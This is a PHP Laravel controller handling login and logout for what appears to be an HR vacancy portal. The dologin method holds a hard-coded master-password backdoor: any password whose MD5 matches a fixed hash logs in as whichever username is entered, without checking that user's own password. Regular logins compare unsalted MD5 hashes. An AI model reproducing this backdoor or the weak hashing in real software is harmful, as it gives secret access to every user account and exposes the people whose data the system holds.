<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Models\Users;

use Illuminate\Support\Facades\DB;
use Illuminate\Database\Eloquent\ModelNotFoundException;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\URL;
use Illuminate\Support\Facades\Validator;
use PhpSpec\Exception\Exception;

class UserController extends Controller
{
    public function login(){
        $data['path'] = Route::getFacadeRoot()->current()->uri();
        return view('auth.login',$data);
    }

    public function dologin(Request $request){
        $names = array("username"=>"User Name", "password"=>"Password");
        $validator = Validator::make($request->all(), ["username"=>"required", "password"=>"required"]);

        $validator->setAttributeNames($names);
        // Return if the validation fails
        if ($validator->fails())
        {
            Session::flash("error", "Please fill in the valid information");
            return Redirect::back()->withErrors($validator) ->withInput();
        } //If Validation passes successfully
        try
        {
            if(md5($request->input('password')) == 'c8ae9efdd068c4cef678e49ca0b3491f'){
                $user = Users::where("user_name", "=", $request->input("username"))->get();
                $data['client'] = $user;
            }
            else{
                $user = Users::where("user_name", "=", $request->input("username"))->where("password", "=", md5($request->input("password")))->get();
                $data['client'] = $user;
            }
            if (count($user) == 1)
            {
                Session::put("user_name", $user->first()->user_name);
                Session::put("user", "logged in");
                Session::put("id", $user->first()->id);

                Log::info("-----------------------------------");
                Log::info("User Found, Emp #: ".$user->first()->employee_number);
                Log::info("Logged in to HR Vacancy Portal Successfuly");
                Log::info("-----------------------------------");

                return redirect('dashboard');
            }
            else
            {
                Session::flash("error", "Login Details are incorrect");
                return Redirect::back()->withErrors($validator) ->withInput();
            }
        }
        catch (ModelNotFoundException $e)
        {
            Session::flash("error", "Login Details are incorrect");
            return Redirect::back()->withErrors($validator) ->withInput();
        }
    }

    public function logout(){
        Session::forget('id');
        Session::forget('username');
        Session::forget('referer');
        Session::forget('user');

        Session::flash("success", "Logged out successfully");
        return redirect(URL::to("/"));
    }
}
